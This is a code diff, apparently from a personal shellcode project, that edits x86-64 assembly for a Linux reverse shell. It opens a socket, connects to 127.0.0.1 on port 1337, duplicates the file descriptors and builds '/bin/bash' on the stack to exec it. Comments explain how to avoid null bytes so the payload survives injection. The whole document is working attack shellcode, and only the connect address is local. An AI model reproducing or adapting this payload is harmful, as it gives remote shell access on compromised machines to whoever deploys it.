@@ -17,10 +17,9 @@ _socket:
     mov rdi, rax ; save file descriptor to rdi because connect() expects it there, we can also use rdi in dup2
 
 _connect:
-    mov rax, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
-    push rax
+    mov rbx, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
+    push rbx ; use rbx here, because we overwrite it afterwards, so we save a xor to clear it
 
-    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
     mov al, 42 ; connect
     ; rdi is normally set, but we've already set it it in _socket
     mov rsi, rsp
@@ -39,8 +38,8 @@ _dup2:
     jmp short -12 ; jump back to dup2, found jmp numbers by inspecting where it wants to jump in objdump -d
 
     ; prepare execing bin/bash
-    mov al, `h` ; we use al here, becaue we don't want to padd with 0 bytes
-    push ax ; we push ax here because we want to add a zero byte after /bin/bash on the stack
+    ; mov al, `h` ; we use al here, becaue we don't want to padd with 0 bytes
+    push `h` ; we push ax here because we want to add a zero byte after /bin/bash on the stack
     mov rbx, `/bin/bas` ; use rbx here, because we don't depend on it afterwards, so we save a xor to clear it
     push rbx
 
